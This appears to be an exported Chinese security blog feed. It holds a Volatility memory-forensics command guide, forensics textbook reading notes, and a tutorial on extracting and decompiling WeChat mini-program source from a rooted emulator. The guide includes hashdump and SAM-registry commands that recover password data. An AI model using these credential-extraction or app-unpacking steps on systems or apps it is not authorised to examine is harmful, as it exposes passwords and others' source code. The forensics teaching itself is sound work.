nf.write(n_nt)</span><br><span class="line">    nf.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">input</span>(<span class="string">&#x27;请输入该目录下的图片名称，例如test.png：\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> f[-<span class="number">3</span>:] == <span class="string">&#x27;png&#x27;</span>:</span><br><span class="line">    png(f)</span><br><span class="line"><span class="keyword">elif</span> f[-<span class="number">3</span>:] == <span class="string">&#x27;jpg&#x27;</span>:</span><br><span class="line">    jpg(f)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;未知文件拓展名！！！&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f[-<span class="number">3</span>:])</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/hack_wh/1604113540540.png" alt="示例"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>内存取证</title>
    <url>/2021/03/12/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>因为第二章主要讲的实验室陈述啥的。。。这里自己总结一下内存取证的方法（今年i春秋新年杯还考了一个内存取证的杂项）</p>
<h3 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h3><p>傻瓜操作，其实他内存取证的工具就是集成了Volatility，但是很鸡肋，打打取证才勉强可以用，功能单一。</p>
<h3 id="Volatility"><a href="#Volatility" class="headerlink" title="Volatility"></a>Volatility</h3><p>专门的内存取证工具，也不需要刻意下载，kali自带，这里总结一些基本命令。</p>
<p>内存镜像文件后缀是vmem,data等</p>
<h4 id="获取插件信息"><a href="#获取插件信息" class="headerlink" title="获取插件信息"></a>获取插件信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility --info</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312162147208.png" alt="image-20210312162147208"></p>
<h4 id="内存信息获取"><a href="#内存信息获取" class="headerlink" title="内存信息获取"></a>内存信息获取</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f 镜像文件路径 imageinfo</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312160930144.png" alt="image-20210312160930144"></p>
<p>获取操作系统：Win7SP1x86_23418（可能的操作系统，Suggested Profile(s) 后的都有可能）</p>
<p>也可以用kdbgscan</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f 镜像文件路径 kdbgscan</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312162623174.png" alt="image-20210312162623174"></p>
<p>可以扫描文件的profile的值，通常扫描结果有多个，只有一个结果是完全正确的，kdbgscan和imageinfo都只适用于windows的镜像。</p>
<h4 id="基本命令格式"><a href="#基本命令格式" class="headerlink" title="基本命令格式"></a>基本命令格式</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f 文件镜像 --profile=&lt;运用的东西&gt; &lt;插件名字&gt; &lt;各种命令&gt;</span><br></pre></td></tr></table></figure>

<p>–profile是调用的配置文件，这个要与插件结合起来</p>
<p>举个栗子</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x64 iehistory </span><br></pre></td></tr></table></figure>

<p>iehistory是看浏览器进程的插件</p>
<h4 id="pslist；pstree；psscan"><a href="#pslist；pstree；psscan" class="headerlink" title="pslist；pstree；psscan"></a>pslist；pstree；psscan</h4><p>查看进程的详细信息（过程ID，该父进程ID(PPID)，线程的数目，把手的数目，日期时间等信息）</p>
<p>pslist无法显示隐藏/终止进程，解决这个问题可以使用psscan</p>
<p>pstree同样也是扫描进程的，但是是以进程树的形式出现的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 pslist</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312165126937.png" alt="image-20210312165126937"></p>
<p>也可以输出至文件查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 pslist&gt;pslist.txt</span><br></pre></td></tr></table></figure>

<h4 id="memdump"><a href="#memdump" class="headerlink" title="memdump"></a>memdump</h4><p>导出某个进程的内存数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 memdump -p [PID] -D [输出位置]</span><br></pre></td></tr></table></figure>

<p>举个栗子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 memdump -p 1884 -D .</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312200942682.png" alt="image-20210312200942682"></p>
<h4 id="dlldump"><a href="#dlldump" class="headerlink" title="dlldump"></a>dlldump</h4><p>导出某个进程的DLL</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 dlldump -p 1884 -D .</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312201633386.png" alt="image-20210312201633386"></p>
<h4 id="cmdscan"><a href="#cmdscan" class="headerlink" title="cmdscan"></a>cmdscan</h4><p>提取内存中保留的 cmd 命令使用情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 cmdscan</span><br></pre></td></tr></table></figure>



<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312170354038.png" alt="image-20210312170354038"></p>
<h4 id="filescan"><a href="#filescan" class="headerlink" title="filescan"></a>filescan</h4><p>扫描当前打开的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 filescan</span><br></pre></td></tr></table></figure>

<p>因为内容比较多通常和grep一起使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 filescan | grep Downloads</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312170941472.png" alt="image-20210312170941472"></p>
<h4 id="dlllist"><a href="#dlllist" class="headerlink" title="dlllist"></a>dlllist</h4><p>能够显示一个进程装载的动态链接库的信息，其显示列表主要包括加载的动态链接库文件的基地址、文件大小以及文件所在路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 dlllist</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312171229906.png" alt="image-20210312171229906"></p>
<h4 id="hivelist"><a href="#hivelist" class="headerlink" title="hivelist"></a>hivelist</h4><p>查看缓存在内存的注册表</p>
<p>PS：注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 hivelist</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312171601874.png" alt="image-20210312171601874"></p>
<h4 id="hivedump"><a href="#hivedump" class="headerlink" title="hivedump"></a>hivedump</h4><p>打印注册表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem –profile=Win7SP1x86_23418 hivedump -o 注册表的 virtual 地址</span><br></pre></td></tr></table></figure>

<p>举个栗子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem –profile=Win7SP1x86_23418 hivedump -o 0x267a33d0</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312194118458.png" alt="image-20210312194118458"></p>
<h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><p>获取内存中的系统密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 hashdump</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312172022689.png" alt="image-20210312172022689"></p>
<h4 id="userassist"><a href="#userassist" class="headerlink" title="userassist"></a>userassist</h4><p>userassist键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 userassist</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312172503799.png" alt="image-20210312172503799"></p>
<h4 id="getsids"><a href="#getsids" class="headerlink" title="getsids"></a>getsids</h4><p>查看SID</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 getsids</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312172946792.png" alt="image-20210312172946792"></p>
<h4 id="malfind"><a href="#malfind" class="headerlink" title="malfind"></a>malfind</h4><p>用于寻找可能注入到各种进程中的恶意软件.使用malfind时也可以使用-p直接指定进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 malfind</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312174903768.png" alt="image-20210312174903768"></p>
<p>pslist一下</p>
<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312175454410.png" alt="image-20210312175454410"></p>
<p>PID是2424</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 malfind -p 2424</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312175524824.png" alt="image-20210312175524824"></p>
<h4 id="printkey"><a href="#printkey" class="headerlink" title="printkey"></a>printkey</h4><p>获取SAM表中的用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312175817185.png" alt="image-20210312175817185"></p>
<p>发现三个用户</p>
<h4 id="mftparser"><a href="#mftparser" class="headerlink" title="mftparser"></a>mftparser</h4><p>提取内存中的MFT记录信息</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 mftparser </span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312180224589.png" alt="image-20210312180224589"></p>
<h4 id="timeliner"><a href="#timeliner" class="headerlink" title="timeliner"></a>timeliner</h4><p>查看访问记录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 timeliner</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312180756536.png" alt="image-20210312180756536"></p>
<h4 id="svcscan"><a href="#svcscan" class="headerlink" title="svcscan"></a>svcscan</h4><p>查看Windows的服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f image.vmem --profile=Win7SP1x86_23418 svcscan</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/neicunquzheng/image-20210312181048102.png" alt="image-20210312181048102"></p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>取证</tag>
        <tag>内存取证</tag>
      </tags>
  </entry>
  <entry>
    <title>取证读书计划打卡（三）</title>
    <url>/2021/03/25/%E5%8F%96%E8%AF%81%E8%AF%BB%E4%B9%A6%E8%AE%A1%E5%88%92%E6%89%93%E5%8D%A1%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h2 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h2><h3 id="列出数字证据的存储格式"><a href="#列出数字证据的存储格式" class="headerlink" title="列出数字证据的存储格式"></a>列出数字证据的存储格式</h3><p>电子数据有动态跟静态的。内存中就是属于动态的，并且不同系统的电子取证方式不同，而且数据文件可有多种格式，一些工具都是具有其专门的证据格式，例如会在原始数据基础上加上循环冗余检查或者哈希校验值。</p>
<p>AFF格式。</p>
<h3 id="解释确定最佳获取方法"><a href="#解释确定最佳获取方法" class="headerlink" title="解释确定最佳获取方法"></a>解释确定最佳获取方法</h3><p>解密用整个磁盘加密过的驱动器。</p>
<ul>
<li><p>创建磁盘到镜像文件</p>
</li>
<li><p>创建磁盘到磁盘副本</p>
</li>
<li><p>创建逻辑磁盘到磁盘或磁盘到数据文件</p>
</li>
<li><p>创建文件夹或文件的稀疏副本</p>
</li>
</ul>
<p>测试无损压缩的一种简单方法是在文件压缩前后对其执行MD5或SHA-1哈希校验</p>
<h3 id="描述数据获取的应急计划"><a href="#描述数据获取的应急计划" class="headerlink" title="描述数据获取的应急计划"></a>描述数据获取的应急计划</h3><p>软硬件在无法工作的时候遇到故障的时候要有应急计划，防止数据丢失。</p>
<p>创建副本，多备份一份。（墨菲定律也适应与电子取证：如果事情有变坏的可能，不管这种可能性有多小，它总会发生。）</p>
<p>在BIOS级别访问驱动器的硬件工具（X-Ways、ProDiscover、Replica）读取磁盘的HPA</p>
<p>微软自带的BitLocker一般情况没办法暴力破解，需要密钥。</p>
<h3 id="如何使用获取工具"><a href="#如何使用获取工具" class="headerlink" title="如何使用获取工具"></a>如何使用获取工具</h3><p>一方面是在犯罪现场取证的工具，另一方面是之后数据分析的工具。现场取证也有一些硬件要求。</p>
<p>一些Linux取证的Linux镜像：</p>
<ul>
<li>Penguin Sleuth (<a href="http://www.linux-forensics.com/">www.linux-forensics.com</a>)</li>
<li>F.I.R.E (<a href="http://fire.dmzs.com/">http://fire.dmzs.com</a>)</li>
<li>CAINE (<a href="http://www.caine-live.net/">www.caine-live.net</a>)</li>
<li>Deft (<a href="http://www.deftlinux.net/">www.deftlinux.net</a>)</li>
<li>Kali Linux (<a href="http://www.kali.org/">www.kali.org</a>)</li>
<li>Knoppix (<a href="http://www.knopper.net/knoppix/index-en.html">www.knopper.net/knoppix/index-en.html</a>)</li>
<li>SANS Investigate Forensic Toolkit (SIFT; <a href="http://computer-forensics.sans.org/">http://computer-forensics.sans.org/</a><br>  community/downloads)</li>
</ul>
<p>这些Linux系统工具也可以处理非Linux系统的数据文件</p>
<h3 id="RAID获取方法"><a href="#RAID获取方法" class="headerlink" title="RAID获取方法"></a>RAID获取方法</h3><p>磁盘阵列（Redundant Arrays of Independent Disks，RAID），有“独立磁盘构成的具有冗余能力的阵列”之意。</p>
<p>因为RAID系统的设计、配置、大小等问题，对其取证比较苦难，大小都是TB级别的。</p>
<p>用更大的磁盘？</p>
<p>一些取证供应商提供了RAID恢复功能。</p>
<h3 id="使用远程网络采集工具"><a href="#使用远程网络采集工具" class="headerlink" title="使用远程网络采集工具"></a>使用远程网络采集工具</h3><p>ProDiscover、EnCase Enterprise、R-Tools R-Studio、WetStone US-LATT PRO等工具</p>
<p>远程采集主要依靠远程操作</p>
<h3 id="其他可用于数据获取的取证工具"><a href="#其他可用于数据获取的取证工具" class="headerlink" title="其他可用于数据获取的取证工具"></a>其他可用于数据获取的取证工具</h3><p>取证工具太多太多</p>
<p>打算弄一个阿里云盘专门放各种取证工具，根据工具的功能进行分类整理，每一个工具镜像等等都附有功能使用方法讲解，然后一个取证小团体的人多人协作共同完善维护。</p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>取证</tag>
        <tag>读书打卡</tag>
      </tags>
  </entry>
  <entry>
    <title>取证读书计划打卡（一）</title>
    <url>/2021/03/06/%E5%8F%96%E8%AF%81%E8%AF%BB%E4%B9%A6%E8%AE%A1%E5%88%92%E6%89%93%E5%8D%A1%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h2 id="任务概况"><a href="#任务概况" class="headerlink" title="任务概况"></a>任务概况</h2><p>《Guide to Computer Forensics and Investigation 5th Edition》每周读一章每周打卡总结</p>
<p>活动打卡地址：<a href="https://shimo.im/sheets/PyQ3GqjwdcWryjVt/MODOC">https://shimo.im/sheets/PyQ3GqjwdcWryjVt/MODOC</a></p>
<p>首先书籍是全英文的，四级都才卡线的我肯定看不懂，可以转word然后用翻译软件批量翻译，我这里阅读是用的一个Github上的开源项目<a href="https://copytranslator.github.io/">CopyTranslator</a></p>
<p><img src="https://ech0zr.github.io/img/post/quzheng/image-20210305223315937.png" alt="image-20210305223315937"></p>
<p>记录的内容仅仅是自己对书籍的个人思考，可能不正确，书中已有内容不做赘述</p>
<h2 id="了解电子数据取证专业和调查"><a href="#了解电子数据取证专业和调查" class="headerlink" title="了解电子数据取证专业和调查"></a>了解电子数据取证专业和调查</h2><h3 id="电子数据取证概述"><a href="#电子数据取证概述" class="headerlink" title="电子数据取证概述"></a>电子数据取证概述</h3><p>电子数据取证包括了计算机取证，网络取证，视频取证等很多领域，并且主要从民事、刑事、行政等案件发展过来。</p>
<p>电子数据取证跟紧急事件响应也有密切的关系，当一个企业的网络被攻击时，及时制止减少损失和保留证据用作之后的追责起诉两者都很重要。</p>
<p>电子数据取证也有一套国际化标准，电子证据的识别、收集、获取、保存等准则。并且每个国家根据自己情况应当有自己的政策和程序。如果一个国家对电子证据没有一套合理的标准，对诉讼方和被告方都是不利的，因为电子数据本身的一些性质，例如容易被篡改，需要一套对其验证的准则。</p>
<h3 id="电子数据取证和其他相关学科"><a href="#电子数据取证和其他相关学科" class="headerlink" title="电子数据取证和其他相关学科"></a>电子数据取证和其他相关学科</h3><p>如今发展到现在，电子数据不仅仅是跟计算机存储有关，一方面网络攻击的案件需要取证，这其实也要设计网络安全的领域，另一方面取证跟密码学等密不可分，嫌疑人会使用加密软件等方式对敏感信息加密，另外硬件也需要取证，随着移动设备的多元化，取证不在局限于计算机，存储介质等等。</p>
<p>数据取证应该是包含数据恢复的，犯罪嫌疑人消灭破坏证据最常用的方式就是删除，覆盖证据，所以取证过程往往都少不了数据恢复。数据恢复本身其实就是一门很大的学科，通常情况下可能只需要借助软件就可以数据恢复，但是在一些极端情况需要专业人员从硬件到软件，从底层重新构建进行恢复，这让我想起了之前10位工程师联手帮一位母亲修复旧手机寻回去世女儿的照片。</p>
<p>所以真正复杂的电子数据取证是需要有分工的。</p>
<h3 id="电子数据取证的简史"><a href="#电子数据取证的简史" class="headerlink" title="电子数据取证的简史"></a>电子数据取证的简史</h3><p>随之计算机的发展，互联网已经成为人人都需要参与的虚拟世界，随之互联网犯罪发展，而电子取证就是打击互联网犯罪的一种手段，这其实是跟现实世界都是一一对应的。所以执法人员不仅仅要在现实世界执法，更要在虚拟世界执法，利用电子数据取证去提取虚拟世界的证据来审判犯罪。</p>
<p>谈一谈电子数据取证在中国的思考，电子数据取证作为一门技术在中国我觉得应该加以“封锁”，应该只让相应的执法人员等等进行学习、使用（当然关于电子取证的一些基础尝试类的还是需要大众普及的）。虽然一些企业面对外部网络攻击也需要取证，但是取证技术的普及会造成反取证技术的升级。并且一些取证公司应该与政府、执法机构密切合作，而不是走商业化的道路，如果人人都有机会掌握傻瓜化的取证工具，那么他们在违法犯罪时会可疑使用一些手段让取证软件无法取证，甚至设计出针对取证软件的反取证工具。当然技术本身是没有界限的，之所以这么认为是觉得应该提高取证的门槛，不能让执法人员使用的取证技术、取证工具、取证手段、取证思维在互联网上泛滥，以此来更有效地打击犯罪（毕竟普通大众是不需要专门的取证学习的）。但是这样可能会阻碍电子取证技术的发展，毕竟商业化更有竞争力。</p>
<h3 id="了解判例法"><a href="#了解判例法" class="headerlink" title="了解判例法"></a>了解判例法</h3><p>在国外可能比较注意个人隐私等权力，但是感觉在中国更重视违法犯罪，只要是犯罪嫌疑人有违法犯罪行为，对其设备经行取证并没有什么避讳。</p>
<h3 id="开发电子数据取证资源"><a href="#开发电子数据取证资源" class="headerlink" title="开发电子数据取证资源"></a>开发电子数据取证资源</h3><p>作为电子数据取证人员需要掌握的东西很多，例如各种操作系统，各种设备，因为你不知道犯罪嫌疑人使用什么进行的违法犯罪，所以复杂的案件需要一些行业专家的密切配合</p>
<h3 id="准备进行数字调查"><a href="#准备进行数字调查" class="headerlink" title="准备进行数字调查"></a>准备进行数字调查</h3><p>在书中他将数字调查分为两类，公共部门调查和私营部门调查，而在国内主要是公共部门调查，毕竟只有公安机关，检察院，国家安全机关等才能行使侦查权。</p>
<p>当然无论是什么取证在之前都要有法律文件的准备。</p>
<h3 id="了解执法机构的调查"><a href="#了解执法机构的调查" class="headerlink" title="了解执法机构的调查"></a>了解执法机构的调查</h3><p>在国内对涉及网络犯罪的取证都会进行电子数据取证，但是一些普通的案件（盗窃、谋杀、威胁等案件）是否需要电子数据取证，是否需要法律文件手续等，这个我不太清楚，但是凭我的见习经验，我觉得主要是靠讯问，对涉及手机等有重要内容的，民警会讯问出密码然后进行查看，如果不知道密码或者内容被删除隐藏可能会直接送检电子数据取证的部门。</p>
<p>计算机，互联网越来越多的是成为一种犯罪的攻击，是犯罪中的一环，所以电子数据取证的需求还是挺大的，日后会不会派出所，县级市都配备专门的电子取证人员。</p>
<h3 id="遵循法律程序"><a href="#遵循法律程序" class="headerlink" title="遵循法律程序"></a>遵循法律程序</h3><p>因为电子数据本身就是一种证据，证据的提取使用肯定要遵循法律程序，包括法庭上的举证质证。</p>
<p>并非每位警察都是专门的电子数据取证人员，但是每位警察都应该懂一些基础的电子数据取证的基础尝试，例如防止犯罪嫌疑人破坏电子数据，了解犯罪嫌疑人破坏电子数据的方式、心理等。</p>
<h3 id="了解私营部门调查"><a href="#了解私营部门调查" class="headerlink" title="了解私营部门调查"></a>了解私营部门调查</h3><p>私人部门企业等容易涉及商业间谍活动，所以其也有有专门的取证人员的对违法活动进行取证诉讼。</p>
<p>制定公司政策，设置好公司员工等的网络权限。因为美国不同州的法律不同。</p>
<p>显示警示标语，涉及权限，利用vpn访问内部资源时要有警示。</p>
<p>指定授权的请求者。</p>
<p>进行安全调查，例如资料泄密，滥用公司资源等等。</p>
<p>私营部门的工作是将证据交给执法人员并在其指导下开始工作，最大程度地降低公司地风险。</p>
<p>区分好个人财产和公司财产，设备比较好区分，但是设备里地数据难区分。</p>
<h3 id="维持专业操守"><a href="#维持专业操守" class="headerlink" title="维持专业操守"></a>维持专业操守</h3><p>首先要保持客观性和机密性，以正直的态度做事。因为作为取证人员直接接触数据，只有取证人员客观真实才能保证整个案件的公平。</p>
<p>另外就是要保密，对没有权限知道案情不透露，与案件无关涉及犯罪嫌疑人个人隐私的内容不透露。</p>
<p>还要不断培训学习技术，因为电子数据取证领域处在 不断的变化当中。保持最新的电子取证工具和电子取证出版物的使用阅读。</p>
<h3 id="准备电子数据取证调查"><a href="#准备电子数据取证调查" class="headerlink" title="准备电子数据取证调查"></a>准备电子数据取证调查</h3><p>收集证据，准备案件，保存证据。</p>
<ul>
<li>对要调查的案件类型进行初步评估</li>
<li>确定案例的初步设计或方法</li>
<li>创建详细的检查表</li>
<li>确定所需的资源</li>
<li>获取和复制证据驱动器</li>
<li>识别风险</li>
<li>减轻风险或使风险最小化</li>
<li>测试设计</li>
<li>分析和恢复数字证据</li>
<li>调查恢复的数据</li>
<li>完成案件报告</li>
<li>评估案件</li>
</ul>
<p>保存证据，保证其不被篡改和污染，需要储存在单独的介质，并且放在安全柜中，对其哈希校验。</p>
<p>对案件要有表格清单。</p>
<p>处理任何计算机组件都要务必小心，以免损坏组件或解除静电，静电可能会将电路元件击穿破坏数字证据，因此在收集计算机证据时要使用防静电袋。并且要确保计算机组件在所需的温度和湿度范围。</p>
<h3 id="高科技调查中的面试和讯问"><a href="#高科技调查中的面试和讯问" class="headerlink" title="高科技调查中的面试和讯问"></a>高科技调查中的面试和讯问</h3><p>有时候从讯问获得的线索将很有助于后面的取证，例如苹果手机的密码，如果能直接从犯罪嫌疑人的口里撬出就不需要后面麻烦的破解。而身为懂电子取证的人员其实如果再结合一些讯问的技巧更能“套路”出我们所需要的信息。</p>
<h3 id="了解数据恢复工作站和软件"><a href="#了解数据恢复工作站和软件" class="headerlink" title="了解数据恢复工作站和软件"></a>了解数据恢复工作站和软件</h3><p>不同系统有不同的文件管理系统，所以数据恢复也不太一样。没有任何一个取证工具能恢复一切，每种工具都有自己的优点和缺点，所以我们尽可能熟悉更多的工具去灵活运用。</p>
<h3 id="手动项目和练习题"><a href="#手动项目和练习题" class="headerlink" title="手动项目和练习题"></a>手动项目和练习题</h3><p>（略）</p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>取证</tag>
        <tag>读书打卡</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序反编译</title>
    <url>/2020/04/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>在GitHub上发现的这个工具堪称神器啊！</p>
<p>直接可以将一些没有严格加密的小程序的源码给他趴下来，而且是完整的源码！！！</p>
<h2 id="qwerty472123-大神nb"><a href="#qwerty472123-大神nb" class="headerlink" title="qwerty472123 大神nb"></a>qwerty472123 大神nb</h2><p>项目地址： <a href="https://github.com/qwerty472123/wxappUnpacker">https://github.com/qwerty472123/wxappUnpacker</a> 、</p>
<p>需要nodejs环境</p>
<h2 id="开启root权限"><a href="#开启root权限" class="headerlink" title="开启root权限"></a>开启root权限</h2><p>我建议用个安卓模拟器就行，我用的MuMu模拟机直接可以开root</p>
<h2 id="下载RE文件管理器"><a href="#下载RE文件管理器" class="headerlink" title="下载RE文件管理器"></a>下载RE文件管理器</h2><p>给root权限</p>
<p>搞机的人都懂，不多介绍</p>
<h2 id="打开微信加载小程序"><a href="#打开微信加载小程序" class="headerlink" title="打开微信加载小程序"></a>打开微信加载小程序</h2><h2 id="寻找小程序包（wxapkg）"><a href="#寻找小程序包（wxapkg）" class="headerlink" title="寻找小程序包（wxapkg）"></a>寻找小程序包（wxapkg）</h2><p>我的目录是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/data/data/com.tencent.mm/MicroMsg/&#123;16进制的字符串&#125;/appbrand/pkg</span><br></pre></td></tr></table></figure>

<p>将相应的wxapkg压缩发送到电脑（不压缩可能被qq吞了）</p>
<h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>一开始报错了</p>
<p>忘记咋解决的了emmmm</p>
<p>百度就可</p>
<p>进入项目安装依赖：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js ******.wxapkg</span><br></pre></td></tr></table></figure>

<p>然后就ok了</p>
<p>该工具也有局限性，详见GitHub。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>微信小程序</tag>
        <tag>反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>取证读书计划打卡（四）</title>
    <url>/2021/04/01/%E5%8F%96%E8%AF%81%E8%AF%BB%E4%B9%A6%E8%AE%A1%E5%88%92%E6%89%93%E5%8D%A1%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h2 id="处理犯罪和事件场景"><a href="#处理犯罪和事件场景" class="headerlink" title="处理犯罪和事件场景"></a>处理犯罪和事件场景</h2><h3 id="识别电子证据"><a href="#识别电子证据" class="headerlink" title="识别电子证据"></a>识别电子证据</h3><p>电子证据可以是任何以数字形式存储或传输的信息。</p>
<h3 id="处理电子证据的一般任务"><a href="#处理电子证据的一般任务" class="headerlink" title="处理电子证据的一般任务"></a>处理电子证据的一般任务</h3><ul>
<li>识别可以作为证据的数据信息或其他人工制品</li>
<li>收集、保存和记录证据</li>
<li>分析、识别和组织证据</li>
<li>重建证据或重复一个情况，以验证结果可以可靠的复制</li>
</ul>
<h3 id="控制电子数据的规则"><a href="#控制电子数据的规则" class="headerlink" title="控制电子数据的规则"></a>控制电子数据的规则</h3><h3 id="处理执法犯罪现场的指导方针"><a href="#处理执法犯罪现场的指导方针" class="headerlink" title="处理执法犯罪现场的指导方针"></a>处理执法犯罪现场的指导方针</h3><h3 id="准备证据搜查的步骤"><a href="#准备证据搜查的步骤" class="headerlink" title="准备证据搜查的步骤"></a>准备证据搜查的步骤</h3><ul>
<li>确定案件性质</li>
<li>识别操作系统或数字设备的类型</li>
<li>决定你是否可以扣押电脑和数字设备</li>
<li>对地点的详细描述</li>
<li>决定谁负责</li>
<li>使用额外的技术专长</li>
<li>确定你需要的工具</li>
<li>准备调查小组</li>
</ul>
<h3 id="保护电脑事故或犯罪现场"><a href="#保护电脑事故或犯罪现场" class="headerlink" title="保护电脑事故或犯罪现场"></a>保护电脑事故或犯罪现场</h3><p>键盘上的DNA残留物</p>
<p>专业的好奇心可以摧毁或破坏证据</p>
